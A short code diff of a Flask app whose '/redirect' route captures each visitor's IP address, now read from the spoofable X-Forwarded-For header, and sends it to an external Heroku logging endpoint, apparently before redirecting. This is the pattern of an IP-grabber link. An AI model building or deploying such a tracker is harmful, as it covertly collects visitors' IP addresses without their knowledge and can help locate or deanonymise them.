@@ -5,11 +5,11 @@ app = Flask(__name__)
 
 @app.route('/redirect', methods=['GET'])
 def send_ip_and_redirect():
-    # Extract the client's IP address
-    client_ip = request.remote_addr
+    # Get the real client IP address from the X-Forwarded-For header
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
     # Send the IP address to another server
-    target_server_url = "https://powerful-castle-33891-b06c61e5b944.herokuapp.com//log_ip"  # Replace with your target server URL
+    target_server_url = "https://powerful-castle-33891-b06c61e5b944.herokuapp.com/log_ip"  # Replace with your target server URL
     payload = {"ip": client_ip}
     
     try:
